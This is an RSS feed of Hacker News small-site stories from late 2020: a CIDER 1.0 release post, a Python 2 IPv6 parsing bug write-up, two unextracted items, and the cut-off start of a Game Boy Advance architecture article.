<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 30 Dec 2020 17:09:35 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 30 Dec 2020 17:09:35 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Cider 1.0]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25568181">thread link</a>) | @rayxi271828
<br/>
December 29, 2020 | https://metaredux.com/posts/2020/12/28/cider-1-0.html | <a href="https://web.archive.org/web/*/https://metaredux.com/posts/2020/12/28/cider-1-0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>You can‚Äôt really know where you are going until you know where you have been.</p>

  <p>‚Äì Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don‚Äôt remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren‚Äôt many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software‚Ä¶</p>

<p>Tim King came across Phil‚Äôs post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project‚Äôs
steward ever since. Third time‚Äôs a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I‚Äôm fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we‚Äôve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I‚Äôm the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there‚Äôs also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release‚Ä¶ Oh, well‚Ä¶</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(‚ÄúSofia‚Äù)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There‚Äôs nothing particularly interesting in this
release - it‚Äôs almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it‚Äôd probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I‚Äôm reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we‚Äôve had to endure. While I
can‚Äôt help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what‚Äôs next? I don‚Äôt really have any particular plans for CIDER 1.1, so we‚Äôll see how exactly it‚Äôs
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I‚Äôm also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label ‚ÄúGood First Issue‚Äù on CIDER‚Äôs issue tracker, so if you‚Äôre looking for
more fun challenges after the end of the ‚ÄúAdvent of Code‚Äù be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I‚Äôm writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER‚Äôs community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>



  </div></div>]]>
            </description>
            <link>https://metaredux.com/posts/2020/12/28/cider-1-0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568181</guid>
            <pubDate>Tue, 29 Dec 2020 09:33:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Node.example.com Is an IP Address]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25565443">thread link</a>) | @nfrmatk
<br/>
December 28, 2020 | https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/ | <a href="https://web.archive.org/web/*/https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <main>
      
  <article>  
    
    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. üìö</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voil√†! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. ü§ø</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ‚úÖ</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> üòí).</p>
<pre><code><span>‚úñ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds
‚úî </span><span>OK</span><span> py36 in </span><span>2</span><span>.</span><span>82</span><span> seconds
‚úî </span><span>OK</span><span> py37 in </span><span>2</span><span>.</span><span>621</span><span> seconds
‚úî </span><span>OK</span><span> py38 in </span><span>2</span><span>.</span><span>524</span><span> seconds
‚úî </span><span>OK</span><span> py39 in </span><span>2</span><span>.</span><span>461</span><span> seconds
</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? ü§î</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'
</span></code></pre>
<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>
<table>
  <tbody><tr>
    <th>Character</th>
    <td>n</td>
    <td>o</td>
    <td>d</td>
    <td>e</td>
    <td>.</td>
    <td>e</td>
    <td>x</td>
    <td>a</td>
    <td>m</td>
    <td>p</td>
    <td>l</td>
    <td>e</td>
    <td>.</td>
    <td>c</td>
    <td>o</td>
    <td>m</td>
  </tr>
  <tr>
    <th>Decimal</th>
    <td>110</td>
    <td>111</td>
    <td>100</td>
    <td>101</td>
    <td>46</td>
    <td>101</td>
    <td>120</td>
    <td>97</td>
    <td>109</td>
    <td>112</td>
    <td>108</td>
    <td>101</td>
    <td>46</td>
    <td>99</td>
    <td>111</td>
    <td>109</td>
  </tr>
  <tr>
    <th>Hexadecimal</th>
    <td>6e</td>
    <td>6f</td>
    <td>64</td>
    <td>65</td>
    <td>2e</td>
    <td>65</td>
    <td>78</td>
    <td>61</td>
    <td>6d</td>
    <td>70</td>
    <td>6c</td>
    <td>65</td>
    <td>2e</td>
    <td>63</td>
    <td>6f</td>
    <td>6d</td>
  </tr>
</tbody></table>
<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>
<pre><code><span>&gt;&gt;&gt; </span><span># Convert the characters in the hostname to hexadecimal.
</span><span>&gt;&gt;&gt; </span><span>hostname </span><span>= </span><span>"node.example.com"
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>= </span><span>""</span><span>.join(</span><span>hex</span><span>(</span><span>ord</span><span>(c))[</span><span>2</span><span>:] </span><span>for </span><span>c </span><span>in </span><span>hostname)
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Convert the "IP address" to text.
</span><span>&gt;&gt;&gt; </span><span>address </span><span>= </span><span>ipaddress.ip_address(hostname)
</span><span>&gt;&gt;&gt; </span><span>str</span><span>(address)
</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Remove the colons from that text.
</span><span>&gt;&gt;&gt; </span><span>address_without_colons </span><span>= </span><span>str</span><span>(address).replace(</span><span>":"</span><span>, </span><span>""</span><span>)
</span><span>&gt;&gt;&gt; </span><span>address_without_colons
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Compare the results and see they're equal.
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>== </span><span>address_without_colons
</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters ‚Ä¶</p></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</a></em></p>]]>
            </description>
            <link>https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565443</guid>
            <pubDate>Tue, 29 Dec 2020 01:12:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to Houseplants]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25565349">thread link</a>) | @Pjki889
<br/>
December 28, 2020 | https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502 | <a href="https://web.archive.org/web/*/https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565349</guid>
            <pubDate>Tue, 29 Dec 2020 00:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching the Unfortunate Parts]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25564666">thread link</a>) | @gary_bernhardt
<br/>
December 28, 2020 | https://www.executeprogram.com/blog/teaching-the-unfortunate-parts | <a href="https://web.archive.org/web/*/https://www.executeprogram.com/blog/teaching-the-unfortunate-parts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.executeprogram.com/blog/teaching-the-unfortunate-parts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564666</guid>
            <pubDate>Mon, 28 Dec 2020 23:37:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture of the Game Boy Advance]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25564619">thread link</a>) | @biwasa
<br/>
December 28, 2020 | https://www.copetti.org/writings/consoles/game-boy-advance/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/game-boy-advance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo‚Äôs <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn‚Äôt the same CPU found on the Game Boy!</em> It‚Äôs effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here‚Äôs <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we‚Äôll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What‚Äôs new?</h4><p>Before ARM Holdings (currently ‚ÄúArm‚Äù) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn‚Äôs computers, Apple‚Äôs Newton, Nokia‚Äôs phones and the Panasonic 3DO.
Nintendo‚Äôs chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU‚Äôs resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> ‚Üí <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> ‚Üí <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> ‚Üí <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> 